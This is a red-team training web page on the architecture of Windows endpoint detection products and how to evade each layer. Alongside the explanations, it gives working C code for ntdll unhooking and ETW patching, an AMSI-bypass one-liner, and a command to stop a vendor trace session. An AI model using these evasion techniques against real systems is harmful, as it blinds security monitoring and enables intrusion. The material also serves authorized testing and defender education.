---
layout: training-page
title: "EDR Internals & Architecture — Red Team Academy"
module: "Evasion"
tags:
  - edr
  - edr-evasion
  - kernel-callbacks
  - etw
  - minifilter
  - windows
page_key: "evasion-edr-internals"
---

<h1>EDR Internals &amp; Architecture</h1>

<p>To evade an EDR effectively, you must understand how it sees you. This page covers the internal architecture of modern EDR products — the kernel and user-mode components, the telemetry sources they consume, and the detection logic they apply. Understanding these internals reveals blind spots and informs evasion strategy.</p>

<h2>EDR Architecture Overview</h2>

<p>A modern Windows EDR has four layers of visibility:</p>

<pre><code># Layer 1: Kernel-mode driver
#   - Kernel callbacks (process, thread, image load, registry, object)
#   - Minifilter driver (file system monitoring)
#   - Network filter driver (WFP — Windows Filtering Platform)
#   - ETW Threat Intelligence provider (kernel-level ETW)
#   - Kernel-mode hooks (legacy, less common now)

# Layer 2: User-mode agent
#   - Ntdll.dll hooking (inline hooks on Nt* functions)
#   - DLL injection into monitored processes
#   - ETW consumer (user-mode ETW sessions)
#   - AMSI provider
#   - Named pipe / IPC monitoring

# Layer 3: Cloud backend
#   - Behavioral analysis engine
#   - ML/AI classification models
#   - Threat intelligence correlation
#   - IOC/YARA matching

# Layer 4: Response capabilities
#   - Process termination / quarantine
#   - Network isolation
#   - File remediation
#   - Memory scanning on-demand</code></pre>

<h2>Kernel Callbacks</h2>

<p>Kernel callbacks are the primary telemetry source for EDR products. They provide reliable, tamper-resistant visibility into system activity.</p>

<h3>Process Creation Callbacks</h3>

<pre><code>// PsSetCreateProcessNotifyRoutineEx
// Called every time a process is created or destroyed
// EDR receives:
//   - Process ID (PID)
//   - Parent Process ID (PPID)
//   - Image file name
//   - Command line arguments
//   - Creation flags
//   - Token information

// How EDRs use this:
// - Detect suspicious parent-child relationships
//   (e.g., Word.exe spawning cmd.exe → likely macro execution)
// - Block known-bad binaries by image hash
// - Track process lineage for behavioral chains

// Evasion implications:
// - Parent PID spoofing can confuse lineage tracking
// - Process hollowing creates a legitimate-looking process
// - Direct syscalls bypass user-mode hooks but NOT kernel callbacks
// - PPID spoofing: CreateProcess with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS

// The callback array is at nt!PspCreateProcessNotifyRoutine
// Array of up to 64 EX_CALLBACK_ROUTINE_BLOCK entries</code></pre>

<h3>Thread Creation Callbacks</h3>

<pre><code>// PsSetCreateThreadNotifyRoutineEx
// Called when threads are created in any process
// EDR receives:
//   - Thread ID
//   - Process ID of target
//   - Start address of the thread

// How EDRs use this:
// - Detect remote thread injection (CreateRemoteThread)
//   Thread created in Process A with start address in unusual memory
// - Detect APC injection (thread start in non-image-backed memory)
// - Track threads starting in RWX memory regions

// Evasion implications:
// - Thread start address matters — point it to legitimate code
// - Use thread hijacking instead of creation (modify existing thread)
// - APC injection using NtQueueApcThread avoids CreateRemoteThread detection
// - Fiber-based execution doesn't create new threads</code></pre>

<h3>Image Load Callbacks</h3>

<pre><code>// PsSetLoadImageNotifyRoutineEx
// Called when any image (DLL, EXE, driver) is loaded
// EDR receives:
//   - Image name / path
//   - Image base address
//   - Image size
//   - Process that loaded it

// How EDRs use this:
// - Detect DLL sideloading (legitimate process loading unsigned DLL)
// - Monitor for reflective DLL loading (DLL loaded from non-file-backed memory)
// - Track .NET assembly loading (clr.dll + mscorlib.dll = .NET execution)
// - Detect Cobalt Strike (loads specific DLLs in beacon pattern)

// Evasion implications:
// - Reflective loading without touching disk avoids file-based scanning
// - But the callback still fires when ntdll maps the image
// - Manual mapping that doesn't use NtMapViewOfSection can evade this
// - Module stomping: overwrite a legitimately loaded DLL's memory</code></pre>

<h3>Object Callbacks</h3>

<pre><code>// ObRegisterCallbacks
// Monitors handle operations on processes and threads
// EDR receives notifications when:
//   - A process opens a handle to another process
//   - Requested access rights (PROCESS_VM_WRITE, PROCESS_CREATE_THREAD, etc.)

// How EDRs use this:
// - Detect handle access to LSASS (credential dumping attempt)
// - Strip dangerous access rights from handles
//   (e.g., remove PROCESS_VM_WRITE from handles to protected processes)
// - Block OpenProcess calls to EDR's own process

// This is how EDRs protect LSASS and themselves:
// CrowdStrike, SentinelOne, etc. use ObRegisterCallbacks to
// intercept and deny handle requests with sensitive access rights

// Evasion implications:
// - Direct syscall to NtOpenProcess bypasses user-mode hooks
//   but ObRegisterCallbacks still intercepts it in kernel
// - Duplicate existing handles instead of opening new ones
// - Use NtDuplicateObject to copy handles from other processes
// - LSASS access via driver (BYOVD) bypasses ObRegisterCallbacks</code></pre>

<h3>Registry Callbacks</h3>

<pre><code>// CmRegisterCallbackEx
// Monitors all registry operations
// EDR can see and block:
//   - Registry key creation/deletion
//   - Value read/write/delete
//   - Key enumeration

// How EDRs use this:
// - Detect persistence via Run keys, services, scheduled tasks
// - Monitor HKLM\SAM access (credential dumping)
// - Track security policy changes
// - Alert on known-bad registry modifications</code></pre>

<h2>User-Mode Hooks</h2>

<p>Most EDRs inject a DLL into every process and hook ntdll.dll functions. This is the most commonly evaded layer.</p>

<pre><code>// How ntdll hooking works:
// 1. EDR's kernel driver registers a PsSetLoadImageNotifyRoutine callback
// 2. When a process loads, the callback fires
// 3. EDR injects its monitoring DLL (e.g., CrowdStrike's csagent.dll)
// 4. The injected DLL overwrites the first bytes of key ntdll functions
//    with a JMP to the EDR's inspection code
//
// Original ntdll!NtAllocateVirtualMemory:
//   4C 8B D1          mov r10, rcx
//   B8 18 00 00 00    mov eax, 18h     ; syscall number
//   0F 05             syscall
//   C3                ret
//
// Hooked ntdll!NtAllocateVirtualMemory:
//   E9 XX XX XX XX    jmp EDR_Hook     ; redirect to EDR
//   ...
//
// EDR's hook function inspects parameters, then either:
//   - Allows: calls original function
//   - Blocks: returns STATUS_ACCESS_DENIED
//   - Logs: records telemetry and allows

// Commonly hooked functions:
// NtAllocateVirtualMemory    — memory allocation (shellcode staging)
// NtWriteVirtualMemory       — writing to other processes
// NtProtectVirtualMemory     — changing memory permissions (RWX)
// NtCreateThreadEx           — thread creation (injection)
// NtMapViewOfSection         — section mapping (DLL loading)
// NtOpenProcess              — opening process handles
// NtCreateFile / NtWriteFile — file operations
// NtCreateSection            — section creation
// NtQueueApcThread           — APC injection</code></pre>

<h3>Detecting Hooks</h3>

<pre><code>// Check if ntdll functions are hooked by comparing against disk copy

// Method 1: Read ntdll from disk and compare .text section
HMODULE hNtdll = GetModuleHandle("ntdll.dll");
// Read C:\Windows\System32\ntdll.dll from disk
// Compare .text section bytes — differences indicate hooks

// Method 2: Check for JMP instruction at function start
BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
if (pFunc[0] == 0xE9 || pFunc[0] == 0xFF) {
    printf("Function is hooked!\n");
    // 0xE9 = JMP rel32 (5-byte hook)
    // 0xFF 0x25 = JMP [rip+disp32] (6-byte hook)
}

// Method 3: SyscallExtractor — enumerate all hooks
// Parse ntdll exports, check each for modifications</code></pre>

<h3>Unhooking Techniques</h3>

<pre><code>// Technique 1: Full ntdll unhooking — overwrite hooked copy with clean copy
// Read clean ntdll from disk, map it, copy .text section over hooked ntdll

HANDLE hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", ...);
HANDLE hMapping = CreateFileMapping(hFile, ...);
LPVOID pClean = MapViewOfFile(hMapping, ...);

// Get current ntdll base
HMODULE hNtdll = GetModuleHandle("ntdll.dll");

// Find .text section in both
PIMAGE_SECTION_HEADER pTextSection = ... ; // parse PE headers
LPVOID pHookedText = (LPVOID)((ULONG_PTR)hNtdll + pTextSection-&gt;VirtualAddress);
LPVOID pCleanText = (LPVOID)((ULONG_PTR)pClean + pTextSection-&gt;VirtualAddress);

// Make hooked text writable, copy clean text over it
DWORD oldProtect;
VirtualProtect(pHookedText, pTextSection-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtect);
memcpy(pHookedText, pCleanText, pTextSection-&gt;Misc.VirtualSize);
VirtualProtect(pHookedText, pTextSection-&gt;Misc.VirtualSize, oldProtect, &amp;oldProtect);

// Technique 2: Per-function unhooking
// Only restore the specific functions you need

// Technique 3: Load a second copy of ntdll
// Map ntdll from \KnownDlls\ntdll.dll or from disk to a new address
// Use the clean copy's functions instead of the hooked ones

// Technique 4: Direct syscalls (skip ntdll entirely)
// See: indirect-syscalls page</code></pre>

<h2>ETW (Event Tracing for Windows)</h2>

<pre><code>// ETW is a kernel-level tracing framework
// EDRs consume ETW events for visibility beyond hooks

// Key ETW providers used by EDRs:
// Microsoft-Windows-Threat-Intelligence  — kernel-level security events
//   - Process injection detection
//   - Credential access monitoring
//   - Requires PPL (Protected Process Light) to consume

// Microsoft-Windows-DotNETRuntime — .NET assembly loading
//   - Detects in-memory .NET execution
//   - Logs assembly names, methods called

// Microsoft-Windows-PowerShell — PowerShell execution
//   - Script block logging
//   - Command invocation logging

// Microsoft-Windows-Kernel-Process — process lifecycle
// Microsoft-Windows-Kernel-File — file operations
// Microsoft-Windows-Kernel-Network — network connections

// ETW TI (Threat Intelligence) provider is special:
// - Lives in the kernel
// - Protected by PPL — only PPL-protected processes can consume it
// - Reports on: NtAllocateVirtualMemory, NtProtectVirtualMemory,
//   NtMapViewOfSection, NtWriteVirtualMemory, NtQueueApcThread
// - Even direct syscalls are reported here
// - This is why direct syscalls alone don't fully evade modern EDR</code></pre>

<h3>ETW Bypass Techniques</h3>

<pre><code>// Technique 1: Patch EtwEventWrite in ntdll (user-mode only)
// Makes the current process blind to ETW
void PatchEtw() {
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &amp;oldProtect);
    *(BYTE*)pEtwEventWrite = 0xC3;  // ret — function returns immediately
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &amp;oldProtect);
}

// Technique 2: Blind the ETW TI provider (requires kernel access)
// Use BYOVD to patch the ETW TI provider registration
// Or remove the EtwThreatIntProvRegHandle in the kernel

// Technique 3: Unregister ETW sessions
// Enumerate and stop ETW trace sessions that EDR is consuming
// logman query -ets  (shows active trace sessions)
// logman stop "SenseNdr" -ets  (stop CrowdStrike's trace — requires admin)

// Technique 4: Provider manipulation
// Modify the GuidEntry for the provider to change EnableInfo
// Sets the enable level to 0, effectively silencing the provider</code></pre>

<h2>Minifilter Drivers</h2>

<pre><code>// Minifilter drivers monitor all file system operations
// EDR uses them to:
// - Scan files on read/write/create
// - Detect malicious file drops
// - Monitor sensitive file access (SAM, NTDS.dit, etc.)
// - Prevent modification of EDR's own files

// List installed minifilter drivers:
fltmc

// Minifilter altitudes determine processing order
// Higher altitude = processes callbacks first
// EDR minifilters typically register at altitude 320000-389999

// Evasion implications:
// - Files written to disk are scanned by the minifilter
// - In-memory-only execution avoids file scanning
// - Rename/move operations may trigger different callbacks
// - Direct volume access (reading raw NTFS) bypasses minifilter
//   (e.g., RawCopy for NTDS.dit extraction)</code></pre>

<h2>AMSI (Antimalware Scan Interface)</h2>

<pre><code>// AMSI provides a standardized interface for applications to request
// malware scans from the installed AV/EDR
// Integrated into: PowerShell, .NET, VBScript, JScript, Office VBA, WSH

// When you run a PowerShell command:
// 1. PowerShell calls AmsiScanBuffer() with the script content
// 2. amsi.dll forwards to the AMSI provider (e.g., Windows Defender)
// 3. Provider returns AMSI_RESULT_DETECTED or AMSI_RESULT_CLEAN
// 4. PowerShell blocks or allows execution based on result

// AMSI bypass — patch AmsiScanBuffer in memory
// See: amsi-bypass page for detailed techniques

// AMSI bypass via reflection (.NET)
// [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
//   GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

// Key point: AMSI is user-mode only
// Direct syscalls and kernel-level operations don't go through AMSI
// AMSI only sees content passed to it by AMSI-integrated applications</code></pre>

<h2>EDR Detection Logic</h2>

<h3>Behavioral Detection Chains</h3>

<pre><code># EDRs don't just flag individual events — they correlate sequences
# Understanding these chains helps you break them

# Example detection chain: Cobalt Strike beacon
# 1. Suspicious process spawn (Word.exe → rundll32.exe)
# 2. Memory allocation with PAGE_EXECUTE_READWRITE
# 3. Named pipe creation matching beacon pattern (\\.\pipe\MSSE-*)
# 4. Periodic HTTP/HTTPS callbacks to unknown infrastructure
# 5. SMB lateral movement attempts
# Each event alone might be benign — together they're high-confidence

# Example detection chain: Credential dumping
# 1. Process opens handle to lsass.exe
# 2. Handle has PROCESS_VM_READ access
# 3. ReadProcessMemory calls to lsass address space
# 4. Data written to file or network

# Breaking the chain:
# - Avoid suspicious parent-child relationships
# - Use legitimate memory allocation patterns
# - Avoid known-bad named pipe patterns
# - Vary callback timing and patterns
# - Use alternative credential access methods</code></pre>

<h3>Memory Scanning</h3>

<pre><code># EDRs periodically scan process memory for:
# - Known shellcode patterns / signatures
# - PE headers in non-image-backed memory (reflective loading)
# - Suspicious memory permission patterns (RWX regions)
# - IOC strings (Cobalt Strike config patterns, etc.)

# Evasion:
# - Encrypt payloads in memory when not executing (sleep obfuscation)
# - Remove PE headers after reflective loading
# - Avoid RWX — allocate RW, write, then change to RX
# - Use legitimate-looking memory layouts
# See: sleep-obfuscation page for detailed techniques</code></pre>

<h2>EDR-Specific Architecture Notes</h2>

<pre><code># CrowdStrike Falcon
# - Kernel driver: csagent.sys
# - User-mode DLL: csagent.dll (injected into processes)
# - Uses kernel callbacks + ETW + user-mode hooks
# - Cloud-first detection — most analysis happens server-side
# - Highly dependent on network connectivity for full detection

# SentinelOne
# - Kernel driver: SentinelMonitor.sys
# - User-mode: SentinelAgent.exe
# - Strong behavioral engine — local AI classification
# - Can operate fully offline (unlike CrowdStrike)
# - Heavy use of kernel callbacks

# Microsoft Defender for Endpoint
# - Built into Windows — deepest OS integration
# - Uses ETW TI provider (PPL-protected)
# - AMSI integration
# - Kernel callbacks via WdFilter.sys
# - Cloud detection via Microsoft Threat Intelligence

# Carbon Black (VMware)
# - cb.exe agent
# - Kernel driver for visibility
# - Strong process tree analysis
# - Less aggressive hooking than CrowdStrike

# Elastic Security
# - Open-source agent (Elastic Agent)
# - Kernel driver: ElasticEndpoint.sys
# - Published detection rules (can be studied)
# - github.com/elastic/detection-rules</code></pre>

<h2>Putting It Together — Evasion Strategy</h2>

<pre><code># Layer-by-layer evasion approach:
#
# 1. User-mode hooks → Direct/indirect syscalls OR ntdll unhooking
# 2. AMSI → Patch AmsiScanBuffer or use non-AMSI-integrated execution
# 3. ETW user-mode → Patch EtwEventWrite
# 4. Kernel callbacks → BYOVD callback removal OR careful behavior
# 5. ETW TI (kernel) → BYOVD to patch kernel ETW OR behavioral evasion
# 6. Minifilter → In-memory execution, avoid file writes
# 7. Cloud analysis → Sleep obfuscation, C2 profile tuning
# 8. Memory scanning → Payload encryption, sleep obfuscation
#
# The most robust approach combines:
# - Kernel-level bypass (BYOVD) for callbacks + ETW TI
# - User-mode unhooking for ntdll hooks
# - AMSI/ETW patching for .NET/PowerShell execution
# - Sleep obfuscation for memory scanner evasion
# - Careful behavioral patterns to avoid heuristic detection</code></pre>

<h2>Resources</h2>

<ul>
  <li>Elastic Detection Rules (open-source) — <code>github.com/elastic/detection-rules</code></li>
  <li>SilentProcessExit (handle duplication) — <code>github.com/deepinstinct/LsassSilentProcessExit</code></li>
  <li>EDRSandblast — <code>github.com/wavestone-cdt/EDRSandblast</code></li>
  <li>Blinding EDR On Windows — Optiv research</li>
  <li>"A Syscall Journey in the Windows Kernel" — Alice Climent-Pommeret</li>
  <li>Windows Internals 7th Edition — Pavel Yosifovich, Alex Ionescu</li>
  <li>LOLDrivers — <code>loldrivers.io</code></li>
</ul>
